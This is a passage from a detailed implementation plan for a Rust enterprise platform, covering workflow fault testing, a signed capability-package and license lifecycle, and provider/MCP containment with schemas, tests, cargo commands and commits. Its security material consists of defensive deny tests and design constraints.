`WorkflowCompiler`、`WorkflowSimulator` and `UpgradePolicy` implement Business §8.4 exactly. The compiler accepts only the six registered step kinds and typed predicates, proves graph reachability/exit/timeout plus effect idempotency/Unknown/compensation and exact registry coverage, and rejects code/SQL/unbounded loops. Simulation uses the live evaluator without effect dispatch. Publication cannot skip deterministic simulation, the registered fault matrix, maker-checker signature or deterministic subject-hash canary. Running instances choose exactly `CONTINUE_PINNED|COMPENSATE_AND_TERMINATE|RESTART_ON_NEW_DEFINITION` with per-instance signed impact evidence；there is no hot mutation. A CRITICAL/duplicate/Unknown/false-closure or signed threshold breach stops new canary assignment and invokes Task 9's existing signed rollback plan；already-started instances follow their approved upgrade decision. `t_f57_aut_003` and `t_f57_aut_006` prove old/new parallel drain, all three strategies, hostile canary selection rejection, canary failure rollback and no skipped compile/simulate/fault/approval stage.

- [ ] **Step 4: Execute the fault matrix**

```rust
#[tokio::test]
async fn every_checkpoint_crash_recovers_to_one_business_effect() {
    for point in CrashPoint::ALL {
        let evidence = run_synthetic_obligation_with_crash(point).await.unwrap();
        assert_eq!(evidence.confirmed_effects, 1);
        assert_eq!(evidence.duplicate_effects, 0);
        assert_eq!(evidence.unresolved_unknown_effects, 0);
    }
}
```

This is an explicit synthetic kernel fixture; it does not claim contract/order/procurement activation before Tasks 19–20. The later business tasks reuse the same fault harness with real handlers.

Run: `cargo test -p ep-platform-flow --test workflow_release && cargo test -p ep-testkit --test f57_automation_fault_matrix -- --nocapture`

Expected: PASS for power loss, lease expiry, duplicate wake-up, clock movement, queue restart, plugin crash, response loss, compensation failure and downstream reopen.

- [ ] **Step 5: Run deterministic and architecture gates**

Run: `cargo test -p ep-platform-flow -p ep-adapter-db-pg -p job-worker -p ep-testkit && cargo xtask archcheck && cargo xtask f57check --task F57-12 --phase post-green`

Expected: PASS; every terminal closure has evidence, every accepted durable task has a checkpoint, and no deterministic business completion depends on AI.

- [ ] **Step 6: Commit**

```bash
git add -- crates/platform/flow/src/closure_registry.rs crates/platform/flow/src/assignment.rs crates/platform/flow/src/candidate_query.rs crates/platform/flow/src/workflow.rs crates/platform/flow/src/compiler.rs crates/platform/flow/src/simulator.rs crates/platform/flow/src/upgrade_policy.rs
git add -- crates/platform/flow/src/human_effect_decision.rs crates/platform/flow/src/objective.rs crates/platform/flow/src/obligation.rs crates/platform/flow/src/effect.rs crates/platform/flow/src/checkpoint.rs crates/platform/flow/src/engine.rs
git add -- crates/platform/flow/tests/durable_cycle.rs crates/platform/flow/tests/assignment_state.rs crates/platform/flow/tests/workflow_release.rs crates/platform/flow/src/lib.rs crates/platform/flow/src/state.rs crates/platform/flow/src/step.rs crates/platform/flow/src/compensation.rs
git add -- crates/platform/flow/Cargo.toml apps/job-worker/src/jobs.rs apps/job-worker/src/wiring/flow.rs apps/job-worker/src/wiring/mod.rs apps/job-worker/Cargo.toml crates/adapter/db-pg/src/platform_flow/objective_store.rs
git add -- crates/adapter/db-pg/src/platform_flow/checkpoint_store.rs crates/adapter/db-pg/src/platform_flow/assignment_store.rs crates/adapter/db-pg/src/platform_flow/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml db/migrations/platform_flow/V20261025092500__platform_flow_create_objective_graph.sql db/migrations/platform_flow/V20261025092600__platform_flow_create_execution_checkpoints.sql
git add -- testkit/tests/f57_automation_fault_matrix.rs testkit/Cargo.toml
git commit -m "feat: add durable objective automation"
```

### Task 13: Introduce signed capability packages separate from license envelopes

**Files:**
- Create: `crates/platform/package/Cargo.toml`
- Create: `crates/platform/package/src/lib.rs`
- Create: `crates/platform/package/src/manifest.rs`
- Create: `crates/platform/package/src/lifecycle.rs`
- Create: `crates/platform/package/src/compat.rs`
- Create: `crates/platform/package/src/trust.rs`
- Create: `crates/platform/package/tests/lifecycle.rs`
- Create: `crates/platform/license/src/runtime.rs`
- Create: `crates/platform/license/src/state.rs`
- Create: `crates/platform/license/tests/f57_lifecycle.rs`
- Modify: `Cargo.toml`
- Modify: `Cargo.lock`
- Modify: `crates/platform/license/src/lib.rs`, `crates/platform/license/Cargo.toml`
- Modify: `crates/platform/license/src/module.rs`
- Modify: `crates/platform/release/src/generation.rs`
- Modify: `crates/platform/release/Cargo.toml`
- Modify: `apps/plugin-host/src/wiring/mod.rs`
- Modify: `apps/plugin-host/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_meta/capability_packages.rs`
- Create: `crates/adapter/db-pg/src/platform_meta/license_state.rs`
- Modify: `crates/adapter/db-pg/src/platform_meta/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_meta/V20261025092700__platform_meta_create_capability_packages.sql`
- Create: `testkit/tests/f57_package_hotplug.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 2 trusted/monotonic clocks, F-56 license/trust intent, Task 9 generations, Task 10 signed migrations and Task 12 automation version pinning.
- Produces: `CapabilityPackageManifestV1`, `PackageArtifact`, `PackagePermissionRequest`, `PackageLifecycle`, `PackageCompatibilityReport` and the complete `GOV-005` license runtime/persistence; license answers “may this deployment use it,” package trust answers “is this artifact safe and compatible.”

- [ ] **Step 1: Write failing separation and lifecycle tests**

```rust
#[test]
fn license_envelope_cannot_smuggle_executable_artifact() {
    let envelope = module_license_envelope().with_field("wasm", "payload.wasm");
    assert_eq!(parse_license(envelope), Err(LicenseError::UnknownField("wasm".into())));
}

#[tokio::test]
async fn drain_swap_preserves_data_and_pins_running_instances() {
    let evidence = hotplug(package_v1(), package_v2(), SwapGrade::DrainAndSwap).await.unwrap();
    assert_eq!(evidence.new_invocations_version, 2);
    assert_eq!(evidence.inflight_invocations_version, 1);
    assert!(evidence.package_data_retained_after_disable);
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-13 --phase pre-red && cargo test -p ep-platform-package --test lifecycle && cargo test -p ep-platform-license --test f57_lifecycle`

Expected: FAIL because the package crate does not exist.

- [ ] **Step 3: Implement manifest and lifecycle types**

```rust
#[derive(serde::Serialize, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CapabilityPackageManifestV1 {
    pub schema_version: u32,
    pub purpose: String,
    pub package_id: uuid::Uuid,
    pub code: String,
    pub version: SemVer,
    pub owner: PackageOwner,
    pub platform_contract: VersionRange,
    pub dependencies: Vec<PackageDependency>,
    pub provided_capabilities: Vec<CapabilityId>,
    pub requested_permission_ceiling: PermissionCeilingV1,
    pub artifacts: Vec<PackageArtifact>,
    pub migrations: Vec<SignedMigrationRef>,
    pub self_tests: Vec<PackageSelfTestV1>,
    pub swap_grade: SwapGrade,
    pub rollback: RollbackContract,
}

pub enum PackageState { Staged, Verified, Approved, ShadowLoaded, Active, Draining, Disabled, Rejected }
```

The on-wire name is `CapabilityPackageManifestPayloadV1`, and `CapabilityPackageManifestV1` is only `SignedBusinessArtifactV1<CapabilityPackageManifestPayloadV1>` using the same strict JCS/detached-CMS/offline-chain/full-CRL/closed-profile verifier as Task 9；`schema_version=1` and `purpose="EP-F57-CAPABILITY-PACKAGE-MANIFEST-V1"` are constants. The payload exact fields are `schema_version,purpose,package_id,code,version,owner,platform_contract,dependencies,provided_capabilities,requested_permission_ceiling,artifacts,migrations,self_tests,swap_grade,rollback,issued_at,not_before,expires_at`；all objects reject unknown fields and expiry is finite.

Nested wire schemas are exact:

- `PackageOwnerV1={owner_kind,owner_id,signer_subject}`，owner kind is `VENDOR|CUSTOMER`, owner ID is UUID and signer is `spki-sha256:<64 lowerhex>`。
- `VersionRangeV1={minimum_inclusive,maximum_exclusive}` uses canonical SemVer；maximum may be null, otherwise strictly greater. `PackageDependencyV1={package_code,version_range,required_capabilities}`，sorted uniquely by package code, no optional/unbounded dependency alias.
- `requested_permission_ceiling` is exactly ADR-0023 `PermissionCeilingV1`, not a look-alike list. Approval produces `PackagePermissionGrantV1={package_manifest_digest,approved_ceiling,approval_ref,approved_by,approved_at,not_before,expires_at,generation}`；approved ceiling must be a subset of the requested ceiling and uses the same canonical resource identities. The formula's `package_ceiling` is this approved ceiling；missing/expired grant is empty permission.
- `PackageArtifactV1` is a `kind` tagged union: `WASM_COMPONENT={kind,artifact_digest,wit_world,wit_contract_digest,runtime_profile="F57_WASMTIME_BROKERED_V1"}`；`SIGNED_JOB_WORKER={kind,artifact_digest,authenticode_signer_subject,pe_machine="X86_64",worker_contract_digest}`；`HYPERV_WINDOWS_CONTAINER={kind,image_digest,windows_base_build,container_contract_digest,activation="HOST_CAPABILITY_CONDITIONAL"}`。No variant may contain path、URL、command、arguments、environment、hook、DLL or embedded SQL. Artifacts sort uniquely by `(kind,artifact/image digest)`。
- `SignedMigrationRefV1={migration_id,version,owner_schema,catalog_reservation_ref,migration_artifact_digest,migration_contract_digest,apply_mode}`；version is the exact reserved 14-digit value, both digests lowerhex, and apply mode is `SIGNED_PLATFORM_MIGRATION_ONLY|CUSTOMER_MODEL_PLAN_ONLY`。It contains no SQL/path/command and can execute only through Task 10 compiler + `ep-migrate`; sorted uniquely by version/migration ID.
- `PackageSelfTestV1={test_id,test_contract_digest,fixture_digest,expected_evidence_schema,timeout_ms}`；test ID is stable, timeout positive/bounded, and no executable/command/script path exists. The host selects a built-in harness by contract digest and emits signed evidence；tests sort uniquely by test ID.
- `RollbackContractV1={mode,compatible_from_versions,reverse_plan_digest,data_retention_mode,deadline_ms}`；mode is `ATOMIC_SWAP_BACK|DRAIN_THEN_SWAP_BACK|FORWARD_FIX_ONLY`，data retention fixed `RETAIN_ALL_PACKAGE_DATA`，versions sorted unique and deadline positive. It cannot run a script or delete data.

Trust accepts the signed vendor root or a customer-owned root listed in the deployment trust roster. The last artifact kind is current `HOST_CAPABILITY_CONDITIONAL`: it cannot activate until Task 14 records Hyper-V/container/nesting/capacity evidence. Missing permission declaration is deny. Package state edges are exactly `STAGED→VERIFIED→APPROVED→SHADOW_LOADED→ACTIVE→DRAINING→DISABLED`，with `STAGED|VERIFIED|SHADOW_LOADED→REJECTED` on failed verification/self-test and `DRAINING→ACTIVE` only as a recorded abort before swap；a disabled/rejected version never jumps to active, re-enable/replacement creates a new approved activation attempt. Disabling keeps schemas, rows, attachments, audit and export metadata readable under retained-data capability.

F-57 不定义第二套许可状态机；Task 13 必须逐字复用 F-56 的唯一权威类型与边界。Rust `LicenseStatus` 恰为 `Active|ExpiringSoon|GracePeriod|Restricted`，wire/SQL 恰为 `ACTIVE|EXPIRING_SOON|GRACE_PERIOD|RESTRICTED`；`LicenseRestrictionReason` 恰为 `NotYetValid|ExpiredBeyondGrace|Revoked|SignatureInvalid|NoCurrentGrant`，wire 恰为对应的 `NOT_YET_VALID|EXPIRED_BEYOND_GRACE|REVOKED|SIGNATURE_INVALID|NO_CURRENT_GRANT`。`PERPETUAL|SUBSCRIPTION` 只是 `LicenseKind`，`REVOKED|EXPIRED_BEYOND_GRACE` 只是 Restricted 的原因，不得再造 `PERPETUAL_ACTIVE`、`GRACE_READ_WRITE`、`REVOKED` 等状态。reason 优先级、`valid_from`、订阅 `valid_to-60 days`、`valid_to`、到期后第 1/30/31 个自然日、永久许可维护期以及可信时间/撤销边界全部以 F-56 §3.3 为唯一口径；有效三态 reason 必须为空，Restricted 必须恰有一个原因。

`V20261025092700__platform_meta_create_capability_packages.sql` 是 F-57 rebaseline 的聚合替代迁移：除新增 capability-package registry/lifecycle 外，它必须完整承接被 disposition seed 取代的 `V20261013090100__platform_core_create_module_registrations.sql` 与 `V20261013090200__platform_core_create_license_grants.sql` 语义，在原 `platform_core` schema 建立 F-56 exact 列、CHECK、唯一键、source/current/history/supersession/revocation 图、法人 scope、可信时间投影和恰 15 行内置模块 seed；不得把表偷偷改放 `platform_meta`，不得丢失 F-56 current/history grant、内外签名来源或 DISABLE 后的数据保留能力。`crates/adapter/db-pg/src/platform_meta/license_state.rs` 只是读取/写入这些 F-56 权威行并计算同一快照结果的 adapter，不创建 `license_state` 真值表、缓存布尔值或第二套持久状态。

许可 grant 的接受、续期与签名撤销，以及模块包 `INSTALL|ENABLE|DISABLE|UPGRADE|ROLLBACK_VERSION` 都是耐久、可审计命令；停用模块或许可进入 Restricted 永不删除 package data、业务历史、附件、审计或可移植导出。Restricted 的运行后果、LIST 法人 scope、15 个内置模块 effective gate、F-55 entitlement，以及五个 restriction reason 下仅允许 `LICENSE_GRANT` 恢复全链和 `MODULE_PACKAGE/DISABLE` 全链的不可扩展例外，也完整继承 F-56，不能由 capability-package 生命周期放宽。

`crates/platform/license/tests/f57_lifecycle.rs` 必须逐项覆盖四个状态、五个 reason 及优先级，PERPETUAL/SUBSCRIPTION 的所有日期边界、current/history/supersession/revocation/source/scope、可信时间倒拨与离线续期、伪造/旧 envelope、Restricted 允许与禁止表面、范围外法人零写入、15 行 module seed 与五个模块动作、停用后数据可见但执行关闭、重新启用重验，以及上述两个恢复例外；`testkit/tests/f57_package_hotplug.rs` 另证明 package 生命周期不能改变任何许可判定或借包执行绕过 module/entitlement gate。

Package signature validity, approval expiry, staged activation windows, drain deadlines and revocation take effect only through Task 2 `TrustedClockV1`/monotonic deadlines. `ep-platform-package` depends on the foundation clock port and receives it at plugin-host wiring; package code may not read wall time directly.

Freeze the crate direction: package may depend on foundation, license and release contracts; release never imports package, authz or domain crates. `SignedGeneration` carries an opaque package-set digest compiled at the composition root. Add one pinned `semver` workspace dependency and reference it with `.workspace = true`; do not declare a second version in the package crate.

- [ ] **Step 4: Run hot-plug and rollback fault tests**

Run: `cargo test -p ep-testkit --test f57_package_hotplug -- --nocapture`

Expected: PASS for atomic WASM generation swap, Windows-worker drain timeout, maintenance-only schema upgrade, self-test failure, dependency loss, signature revocation and automatic rollback. No case loads a native DLL or accepts direct SQL.

- [ ] **Step 5: Run workspace and architecture gates**

Run: `cargo test -p ep-platform-package -p ep-platform-license -p ep-platform-release -p plugin-host -p ep-adapter-db-pg -p ep-testkit && cargo test -p ep-platform-license --test f57_lifecycle && cargo xtask archcheck && cargo xtask sqlcheck && cargo xtask f57check --task F57-13 --phase post-green`

Expected: PASS; package and license types remain separate crates and database projections.

- [ ] **Step 6: Commit**

```bash
git add -- crates/platform/package/Cargo.toml crates/platform/package/src/lib.rs crates/platform/package/src/manifest.rs crates/platform/package/src/lifecycle.rs crates/platform/package/src/compat.rs crates/platform/package/src/trust.rs
git add -- crates/platform/package/tests/lifecycle.rs crates/platform/license/src/runtime.rs crates/platform/license/src/state.rs crates/platform/license/tests/f57_lifecycle.rs Cargo.toml Cargo.lock
git add -- crates/platform/license/src/lib.rs crates/platform/license/Cargo.toml crates/platform/license/src/module.rs crates/platform/release/src/generation.rs crates/platform/release/Cargo.toml apps/plugin-host/src/wiring/mod.rs
git add -- apps/plugin-host/Cargo.toml crates/adapter/db-pg/src/platform_meta/capability_packages.rs crates/adapter/db-pg/src/platform_meta/license_state.rs crates/adapter/db-pg/src/platform_meta/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml
git add -- db/migrations/platform_meta/V20261025092700__platform_meta_create_capability_packages.sql testkit/tests/f57_package_hotplug.rs testkit/Cargo.toml
git commit -m "feat: add signed capability package lifecycle"
```

### Task 14: Add governed providers, WASM, signed Job workers and conditional Hyper-V containers

**Files:**
- Existing authoritative input: `docs/adr/ADR-0023-f57-provider-manifest-resource-grant.md`
- Existing authoritative input: `docs/superpowers/specs/2026-08-22-f55-approved-ai-mcp-server-admin-cloud-freeze.md` §4, limited to the non-conflicting MCP protocol/containment/audit rules preserved by `RULING-MCP-01`
- Modify: `docs/data-dictionary/ai_mcp.md`
- Modify: `docs/data-dictionary/platform_audit.md`
- Create: `crates/platform/provider/Cargo.toml`
- Create: `crates/platform/provider/src/lib.rs`
- Create: `crates/platform/provider/src/manifest.rs`
- Create: `crates/platform/provider/src/grant.rs`
- Create: `crates/platform/provider/src/invocation.rs`
- Create: `crates/contract/mcp/Cargo.toml`
- Create: `crates/contract/mcp/src/lib.rs`
- Create: `crates/contract/mcp/src/dto.rs`
- Create: `crates/contract/mcp/src/port.rs`
- Create: `crates/contract/mcp/src/tool.rs`
- Create: `crates/contract/mcp/tests/abi.rs`
- Create: `crates/contract/mcp/tests/exchange_stream.rs`
- Create: `crates/platform/mcp/Cargo.toml`
- Create: `crates/platform/mcp/src/lib.rs`
- Create: `crates/platform/mcp/src/manifest.rs`
- Create: `crates/platform/mcp/src/binding.rs`
- Create: `crates/platform/mcp/src/grant.rs`
- Create: `crates/platform/mcp/src/authorization.rs`
- Create: `crates/platform/mcp/src/audit.rs`
- Create: `crates/platform/mcp/tests/manifest.rs`
- Modify: `crates/foundation/src/security/context.rs`
- Modify: `crates/platform/audit/src/lib.rs`
- Modify: `Cargo.toml`
- Create: `crates/adapter/wasm/src/engine.rs`
- Create: `crates/adapter/wasm/src/limits.rs`
- Modify: `crates/adapter/wasm/src/lib.rs`
- Modify: `crates/adapter/wasm/Cargo.toml`
- Create: `crates/adapter/windows-worker/Cargo.toml`
- Create: `crates/adapter/windows-worker/src/lib.rs`
- Create: `crates/adapter/windows-worker/src/job.rs`
- Create: `crates/adapter/windows-worker/src/launch.rs`
- Create: `crates/adapter/windows-worker/src/verify.rs`
- Create: `crates/adapter/windows-worker/tests/job_containment.rs`
- Create: `crates/adapter/windows-container/Cargo.toml`
- Create: `crates/adapter/windows-container/src/lib.rs`
- Create: `crates/adapter/windows-container/src/host_probe.rs`
- Create: `crates/adapter/windows-container/src/hcs.rs`
- Create: `crates/adapter/windows-container/src/lifecycle.rs`
- Create: `crates/adapter/windows-container/tests/hyperv_containment.rs`
- Modify: `apps/plugin-host/src/main.rs`
- Modify: `apps/plugin-host/src/config.rs`
- Modify: `apps/plugin-host/src/wiring/mod.rs`
- Create: `apps/plugin-host/src/mcp.rs`
- Modify: `apps/plugin-host/Cargo.toml`
- Modify: `apps/integration-gateway/src/config.rs`
- Modify: `apps/integration-gateway/src/egress.rs`
- Modify: `apps/integration-gateway/src/main.rs`
- Modify: `apps/integration-gateway/src/wiring/mod.rs`
- Create: `apps/integration-gateway/src/mcp.rs`
- Modify: `apps/integration-gateway/Cargo.toml`
- Create: `apps/core-server/src/platform/mcp.rs`
- Create: `apps/core-server/src/platform/mcp_grants.rs`
- Modify: `apps/core-server/src/platform/middleware.rs`
- Modify: `apps/core-server/src/platform/mod.rs`
- Modify: `apps/core-server/src/wiring/mod.rs`
- Modify: `apps/core-server/src/lib.rs`
- Modify: `apps/core-server/src/main.rs`
- Modify: `apps/core-server/Cargo.toml`
- Modify: `Cargo.lock`
- Modify: `crates/platform/runtime/src/process.rs`
- Create: `crates/adapter/db-pg/src/platform_meta/provider_manifests.rs`
- Create: `crates/adapter/db-pg/src/platform_meta/mcp_connectors.rs`
- Create: `crates/adapter/db-pg/src/platform_meta/mcp_transport_registry.rs`
- Modify: `crates/adapter/db-pg/src/platform_audit/mod.rs`
- Create: `crates/adapter/db-pg/src/platform_authz/mcp_human_grants.rs`
- Modify: `crates/adapter/db-pg/src/platform_authz/mod.rs`
- Modify: `crates/adapter/db-pg/src/platform_meta/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_meta/V20261025092800__platform_meta_create_provider_manifests.sql`
- Create: `testkit/tests/f57_provider_containment.rs`
- Create: `testkit/tests/f57_mcp_protocol.rs`
- Create: `testkit/tests/f57_mcp_containment.rs`
- Create: `testkit/tests/f57_integration_gateway_no_sql.rs`
- Create: `testkit/tests/f57_hyperv_container.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 2 trusted/monotonic clocks, Task 8 capability decisions, Task 12 effect/reconciliation protocol and Task 13 package permission grants.
- Produces exactly ADR-0023 `ProviderManifestV1`, `PermissionCeilingV1`, `ResourceGrantV1`, `InvocationEnvelope`, `ProviderOutcome`, full inbound/outbound MCP transport + signed dynamic tool/resource manifest/grant/audit contracts, and `ProviderHost::invoke`; no provider or MCP carrier receives PostgreSQL credentials.

- [ ] **Step 1: Write failing zero-permission and transaction-boundary tests**

```rust
#[tokio::test]
async fn undeclared_network_file_field_and_secret_are_denied() {
    let host = host_with_manifest(empty_manifest());
    assert_eq!(host.open_network("api.example.com", 443).await, Err(Denied::Network));
    assert_eq!(host.read_field("crm.customer", "phone").await, Err(Denied::Field));
    assert_eq!(host.read_secret("esign/api").await, Err(Denied::Secret));
    assert_eq!(host.open_file("D:\\EnterprisePlatform\\data\\files\\x").await, Err(Denied::File));
}

#[test]
fn mcp_write_tool_targets_a_typed_command_not_sql() {
    let tool = McpToolDescriptorV1::parse(order_submit_manifest()).unwrap();
    assert_eq!(tool.target, ToolTarget::CapabilityCommand("sales.order.submit".parse().unwrap()));
    assert!(tool.sql.is_none());
}

#[tokio::test]
async fn mcp_transport_is_versioned_bounded_and_has_no_generic_method() {
    assert_eq!(MCP_PROTOCOL_VERSION, "2026-07-28");
    assert_eq!(McpAllowedMethod::ALL.len(), 6);
    assert!(post_mcp(request_over_bytes(1_048_576)).await.is_payload_too_large());
    assert!(post_mcp(json_rpc("sampling/createMessage")).await.is_method_not_allowed());
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-14 --phase pre-red && cargo test -p ep-platform-provider && cargo test -p ep-contract-mcp && cargo test -p ep-platform-mcp && cargo test -p ep-testkit --test f57_mcp_protocol --test f57_mcp_containment`

Expected: FAIL because provider and MCP contracts are absent.

- [ ] **Step 3: Implement exact manifests and outcomes**

```rust
pub struct InvocationEnvelope {
    pub invocation_id: uuid::Uuid,
    pub provider_id: uuid::Uuid,
    pub capability: CapabilityId,
    pub operation_code: OperationCode,
    pub effect_kind: ProviderEffectKind,
    pub input_contract_digest: Sha256Digest,
    pub output_contract_digest: Sha256Digest,
    pub reconcile_operation_code: Option<OperationCode>,
    pub reconcile_contract_digest: Option<Sha256Digest>,
    pub generation: GenerationId,
    pub legal_entity_id: uuid::Uuid,
    pub invocation_origin: InvocationOriginV1,
    pub authority_epoch: u64,
    pub authorization_context_digest: Sha256Digest,
    pub idempotency_key: String,
    pub deadline: TrustedUtc,
    pub monotonic_deadline: MonotonicDeadline,
    pub input: serde_json::Value,
}

pub enum ProviderOutcome {
    Confirmed { external_ref: String, evidence_digest: [u8; 32] },
    Rejected { stable_code: String, retryable: bool },
    Unknown { reconciliation_key: String },
}
```

Manifest and grant schemas, canonical encoding, signature/revocation behavior and the four-way effective-permission intersection are copied from ADR-0023 without widening. `permission_ceiling.legal_entities`、`.data_classes` and `.resource_ceiling` are the sole provider authorities for法人、分类和资源；legacy `data_policy.permitted_legal_entities`、`data_policy.maximum_classification` or top-level `resource_ceiling` is an unknown-field error, never an alias/min/override. `InvocationEnvelope` and `ResourceGrantV1` both carry the exact same ADR-0023 `InvocationOriginV1`、authority epoch、authorization-context digest and selected `ProviderOperationBindingV1` seven-tuple `{capability,operation_code,effect_kind,input_contract_digest,output_contract_digest,reconcile_operation_code,reconcile_contract_digest}`；the host dispatches only that operation and UNKNOWN reconciliation uses only its bound reconcile operation. Interactive session/device identity、durable Objective/WorkItem/assignment identity and non-delegable lifecycle identity are disjoint tagged variants；no nullable/fabricated session or copied human grant can authorize a scheduled、retry、compensation、reconciliation or health invocation. Multiple operations may share a schema digest without becoming interchangeable. `f57_provider_containment` executes every mandatory ADR-0023 conformance case verbatim: the original nine named single-authority/canonical/SecurityLevel cases, the package/provider/grant/runtime four-way `{10,20,30,40}∩{10,20,30}∩{10,20}∩{10}={10}` intersection and unknown/unsorted/duplicate failures, every origin cross-variant/null/session-copy/terminal-work-item/stale-assignment/wrong-lifecycle-operation/epoch/context-digest mutation, every capability/operation/effect/contract/reconcile swap or null-shape mismatch, plus every §2.2 retention/logging/training/operation-linkage/timeout/disable/Unknown negative. Physical and IaaS carriers produce different host evidence: a physical host proves local Hyper-V/Windows Containers/isolation, firmware and capacity; an IaaS host additionally proves approved mainland region, tenant control, vTPM, nested-virtualization support and provider-root isolation. Missing or stale carrier evidence makes the container carrier `HOST_CAPABILITY_UNAVAILABLE`；the UPS-only value `CAPABILITY_INSUFFICIENT` is rejected here. XML is not a generic core format: only a signed provider that declares a concrete codec/XSD and still submits `ImportProposal` or typed commands may process it; unknown XML/SOAP/XSD is denied and remains `DEF-011`.

Implement ADR-0023's dedicated `ProviderHealthBindingV1` as a lifecycle-only path, not as an eighth field in `ProviderOperationBindingV1` or an undeclared business capability. It exact-joins the health INPUT/OUTPUT contracts、forces READ_ONLY and `platform.provider.health`、uses only the fixed `PROVIDER_HEALTH_MINIMAL_V1` resource profile and is callable solely by a grant whose origin is the non-delegable authority lifecycle principal with `lifecycle_operation=HEALTH_PROBE`. The broker passes no customer body/identifier、ordinary business grant、file or secret；remote health may reach only the signed carrier endpoint. Conformance adds wrong origin/capability/effect/digest、interactive/durable/user/plugin invocation、customer bytes、resource expansion、health result treated as business evidence and health operation missing from either contract direction. Thus every health dispatch is typed/audited without creating a hidden bypass capability.

MCP tools declare JSON schema, risk, capability, fields, objects, network, file, secret and approval requirements. The host maps every write to Task 6's command pipeline. Provider processes receive short-lived invocation-scoped handles over authenticated local IPC; environment variables and command lines contain no customer secret.

`RULING-MCP-01` supersedes only F-55's permanent **tool/capability** closed set: signed current manifests may add typed tools/resources. It does not erase the non-conflicting transport grammar. Task 14 therefore implements, rather than merely names, the following exact MCP v1 contract:

- protocol version is exactly `2026-07-28`; the one current transport machine registry is the canonical `MCP_TRANSPORT_REGISTRY` generation item `McpTransportRegistryV1={schema_version:1,purpose:"EP-F57-MCP-TRANSPORT-REGISTRY-V1",protocol_version:"2026-07-28",listener_owner:"core-server",path:"/mcp",method:"POST",allowed_jsonrpc_methods:["resources/list","resources/read","resources/templates/list","server/discover","tools/call","tools/list"],generation}`. It contains no self-referential `manifest_digest` or connector identity：its exact JCS digest is the enclosing `GenerationItemV1.item_payload_sha256` and the signed current generation is its sole authority. The byte-sorted method array is exact. After Task 9 signature/current-generation verification, core-server projects exact bytes/digest into separate append-only `platform_meta.mcp_transport_registry_versions`; this table has one current slot per deployment, while `mcp_manifest_versions` remains the independent many-connector manifest history. The historical `mcp-management.v1.yaml` never supplies runtime route state. `apps/core-server/src/platform/mcp.rs` is the unique inbound HTTPS adapter and registers exactly `POST /mcp` in the core-server router；`mcp_grants.rs` resolves the current transport registry、connector manifest and human grant and maps to `ep-platform-mcp`. No other app/listener may own `/mcp`. `GET /mcp` and `DELETE /mcp` return 405；batch、notification/response input、session/legacy GET-SSE、DCR、Sampling、Roots、Tasks、Logging、prompts、elicitation、completion、subscription and unknown methods are rejected before dispatch;
- each POST requires `Content-Type: application/json`、`Accept: application/json, text/event-stream`、`MCP-Protocol-Version` and `Mcp-Method` exact-match with the strict JSON-RPC body；`Mcp-Name` is required only for `tools/call`/`resources/read` and exact-matches `params.name|uri`。F-55 §4's one-pass canonical header encoding/redaction、request-ID/error envelope and HTTP/JSON-RPC/stable-code table are imported byte-for-byte；no alternate header or verbose error shape exists;
- request terminal bytes are `1..=1,048,576`, response terminal bytes `1..=8,388,608`, absolute monotonic deadline 30 seconds, connector rate 60 calls per rolling minute with no burst, global in-flight 16 and per-connector 4. Unknown result/effect after dispatch enters Task 12 reconciliation and is never blindly retried;
- outbound transport union is exactly `REMOTE_STREAMABLE_HTTP|LOCAL_SIGNED_STDIO|LOCAL_WINDOWS_HYPERV_CONTAINER`。Remote uses the manifest-fixed HTTPS origin, DNS/IP/SPKI/redirect/proxy/egress controls and accepts immediate JSON or exactly one terminal request-scoped SSE event. Stdio uses a signed CAB/Authenticode child、restricted token、Job Object、private authenticated pipe and secret pipe; no secret enters argv/env. Hyper-V is the implemented but `HOST_CAPABILITY_CONDITIONAL` carrier from this task and remains inactive on P340 until real host evidence passes;
- gateway/plugin-host exchange uses F-55 §4's distinct `McpExchangeChunkStreamV1` with nine frame variants `RequestBegin|RequestChunk|RequestEnd|DispatchAuthorized|ResponseBegin|ResponseChunk|ResponseEnd|Abort|Ack`，4-byte big-endian frame length、524,288-byte decoded chunk bound、independent zero-based sequences、digest/length verification and one terminal dispatch. It is not the attachment stream and has no resume/replay semantics;
- a human inbound grant is maximum 600 seconds/100 calls and binds deployment、legal entity、user、session、device、connector、manifest digest、allowed method/tool/resource bindings、counter and expiry. Device proof/counter is atomically consumed after rate/admission and before ATTEMPT. Logout、device/session/user/法人/manifest/generation/package revocation invalidates it. A caller cannot assert actor、scope、risk、field or resource handle;
- `McpToolDescriptorV1` and resource bindings are strict, signed and generation-bound. Tool names are dynamically extensible only through the current manifest, but every binding maps to an existing typed Task 6 command/query/capability and an exact input/output JSON Schema + field/object/data-class/resource ceiling. SQL、shell、arbitrary filesystem/network、unregistered URI template and high-risk approval conclusion/config/key/backup/destructive action are impossible targets;
- identity-resolved calls pre-reserve bounded HDD audit-completion capacity, append one immutable ATTEMPT before dispatch and exactly one terminal COMPLETION after dispatch; payload/name/URI/secret bytes are excluded and only digests, stable binding/field codes, outcome and evidence refs persist. If ATTEMPT cannot commit there is zero dispatch；after ATTEMPT, crash/timeout becomes `UNKNOWN_AFTER_CRASH` and reconciliation, never silent success or replay. Identity-unresolved transport rejection writes only the fixed redacted deployment security event.

